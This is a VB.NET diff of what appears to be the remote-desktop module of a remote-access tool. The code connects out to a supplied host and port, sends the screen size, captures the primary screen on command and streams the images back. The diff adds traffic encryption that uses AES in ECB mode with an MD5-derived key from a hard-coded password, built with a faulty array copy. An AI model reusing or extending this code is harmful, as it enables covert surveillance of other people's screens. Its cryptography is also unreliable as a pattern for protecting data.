@@ -1,17 +1,17 @@
 ﻿Imports System.Net.Sockets
+Imports System.Security.Cryptography
 Imports System.Windows.Forms
 
 Public Class Main
 
 
 
-    Public Shared Sub RC(ByVal H As String, ByVal P As Integer, ByVal K As String)
+    Public Shared Sub RC(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal PW As String)
 
         KEY = K
-        ' create memory stream
+        pass = PW
         Dim lp As Integer = 0
 
-e:      ' clear things and ReConnect
         CN = False
         Try
             C.Client.Disconnect(False)
@@ -33,6 +33,7 @@ e:      ' clear things and ReConnect
             lp = 0
             C.Client.Connect(H, P)
             CN = True
+            cap.Clear()
             Dim s = Screen.PrimaryScreen.Bounds.Size
             Send("!" & SPL & s.Width & SPL & s.Height)
         Catch ex As Exception
@@ -47,7 +48,7 @@ re:
             If lp > 500 Then
                 lp = 0
                 ' check if i am still connected
-                If C.Client.Poll(-1, Net.Sockets.SelectMode.SelectRead) And C.Client.Available <= 0 Then GoTo e
+                If C.Client.Poll(-1, Net.Sockets.SelectMode.SelectRead) And C.Client.Available <= 0 Then GoTo cc
             End If
             If C.Available > 0 Then
                 Dim B(C.Available - 1) As Byte
@@ -55,7 +56,7 @@ re:
                 M.Write(B, 0, B.Length)
 rr:
                 If BS(M.ToArray).Contains(K) Then ' split packet..
-                    Dim A As Array = fx(M.ToArray, K)
+                    Dim A As Array = SplitByWord(M.ToArray, K)
                     Dim T As New Threading.Thread(AddressOf Data)
                     T.Start(A(0))
                     M.Dispose()
@@ -67,16 +68,16 @@ rr:
                 End If
             End If
         Catch ex As Exception
-            GoTo e
+            GoTo cc
         End Try
         Threading.Thread.CurrentThread.Sleep(1)
         GoTo re
-
 cc:
         CloseMe()
     End Sub
 
     Public Shared Sub CloseMe()
+        Threading.Thread.Sleep(1)
         Try
             C.Client.Close()
         Catch ex As Exception
@@ -87,72 +88,53 @@ cc:
         End Try
         C = Nothing
         Try
-            cap.Clear()
+            M.Dispose()
         Catch ex3 As Exception
         End Try
-        Try
-            M.Dispose()
-        Catch ex4 As Exception
-        End Try
     End Sub
+
 
     Public Shared bmb = New List(Of Byte())()
     Public Shared cap As New CRDP
     Public Shared Bb As Byte()
     Public Shared Sub Data(ByVal b As Byte())
-        Dim A As String() = Split(BS(b), SPL)
+        Dim A As String() = Split(AES_Decrypt(BS(b)), SPL)
 
         Try
             Select Case A(0)
-                Case "!"
-                    cap.Clear()
-                    Dim s = Screen.PrimaryScreen.Bounds.Size
-                    Send("!" & SPL & s.Width & SPL & s.Height)
 
                 Case "@" ' Start Capture
-                    Try
-                        Dim SizeOfimage As Integer = A(1)
-                        Dim Split As Integer = A(2)
-                        Dim Quality As Integer = A(3)
-                        Bb = cap.Cap(SizeOfimage, Split, Quality)
-                        Dim MM As New IO.MemoryStream
-                        Dim CMD As String = "@" & SPL
+                    Dim SizeOfimage As Integer = A(1)
+                    Dim Split As Integer = A(2)
+                    Dim Quality As Integer = A(3)
 
-                        MM.Write(SB(CMD), 0, CMD.Length)
-                        MM.Write(Bb, 0, Bb.Length)
-                        Dim obj As List(Of Byte()) = bmb
-                        SyncLock obj
-                            Send(MM.ToArray)
-                        End SyncLock
-                        MM.Dispose()
-                    Catch ex As Exception
-                    End Try
+                    Dim Bb As Byte() = cap.Cap(SizeOfimage, Split, Quality)
+                    Dim obj As List(Of Byte()) = bmb
+                    SyncLock obj
+                        Send("@" + SPL + BS(Bb))
+                    End SyncLock
 
                 Case "Close"
                     CloseMe()
             End Select
-
         Catch ex As Exception
         End Try
 
     End Sub
 
-
-
-    Public Shared Function fx(ByVal b As Byte(), ByVal WRD As String) As Array ' split bytes by word
-        Dim a As New Collections.Generic.List(Of Byte())
+    Public Shared Function SplitByWord(ByVal b As Byte(), ByVal WORD As String) As Array
+        Dim a As New List(Of Byte())
         Dim M As New IO.MemoryStream
         Dim MM As New IO.MemoryStream
-        Dim T As String() = Split(BS(b), WRD)
+        Dim T As String() = Split(BS(b), WORD)
         M.Write(b, 0, T(0).Length)
-        MM.Write(b, T(0).Length + WRD.Length, b.Length - (T(0).Length + WRD.Length))
+        MM.Write(b, T(0).Length + WORD.Length, b.Length - (T(0).Length + WORD.Length))
         a.Add(M.ToArray)
         a.Add(MM.ToArray)
         M.Dispose()
         MM.Dispose()
         Return a.ToArray
     End Function
-
 
     Public Shared Sub Send(ByVal b As Byte())
         If CN = False Then Exit Sub
@@ -166,19 +148,58 @@ cc:
             CN = False
         End Try
     End Sub
+
     Public Shared Sub Send(ByVal S As String)
-        Send(SB(S))
+        Send(SB(AES_Encrypt(S)))
     End Sub
+
     Public Shared CN As Boolean = False
 
-    Public Shared Function SB(ByVal s As String) As Byte() ' string to byte()
-        Return System.Text.Encoding.Default.GetBytes(s)
+    Public Shared Function SB(ByVal s As String) As Byte()
+        Return Text.Encoding.Default.GetBytes(s)
     End Function
 
-    Public Shared Function BS(ByVal b As Byte()) As String ' byte() to string
-        Return System.Text.Encoding.Default.GetString(b)
+    Public Shared Function BS(ByVal b As Byte()) As String
+        Return Text.Encoding.Default.GetString(b)
     End Function
 
+    Public Shared Function AES_Encrypt(ByVal input As String)
+        Dim AES As New RijndaelManaged
+        Dim Hash_AES As New MD5CryptoServiceProvider
+        Dim encrypted As String = ""
+        Try
+            Dim hash(31) As Byte
+            Dim temp As Byte() = Hash_AES.ComputeHash(SB(pass))
+            Array.Copy(temp, 0, hash, 0, 16)
+            Array.Copy(temp, 0, hash, 15, 16)
+            AES.Key = hash
+            AES.Mode = CipherMode.ECB
+            Dim DESEncrypter As ICryptoTransform = AES.CreateEncryptor
+            Dim Buffer As Byte() = SB(input)
+            encrypted = Convert.ToBase64String(DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
+            Return encrypted
+        Catch ex As Exception
+        End Try
+    End Function
+
+    Public Shared Function AES_Decrypt(ByVal input As String)
+        Dim AES As New RijndaelManaged
+        Dim Hash_AES As New MD5CryptoServiceProvider
+        Dim decrypted As String = ""
+        Try
+            Dim hash(31) As Byte
+            Dim temp As Byte() = Hash_AES.ComputeHash(SB(pass))
+            Array.Copy(temp, 0, hash, 0, 16)
+            Array.Copy(temp, 0, hash, 15, 16)
+            AES.Key = hash
+            AES.Mode = CipherMode.ECB
+            Dim DESDecrypter As ICryptoTransform = AES.CreateDecryptor
+            Dim Buffer As Byte() = Convert.FromBase64String(input)
+            decrypted = BS(DESDecrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
+            Return decrypted
+        Catch ex As Exception
+        End Try
+    End Function
 
     Public Shared C As TcpClient = Nothing
     Public Shared KEY As String = String.Empty
@@ -186,5 +207,6 @@ cc:
     Public Shared _P
     Public Shared SPL As String = "|'L'|"
     Public Shared M As New IO.MemoryStream
+    Public Shared pass As String = "|'X'|"
 
 End Class
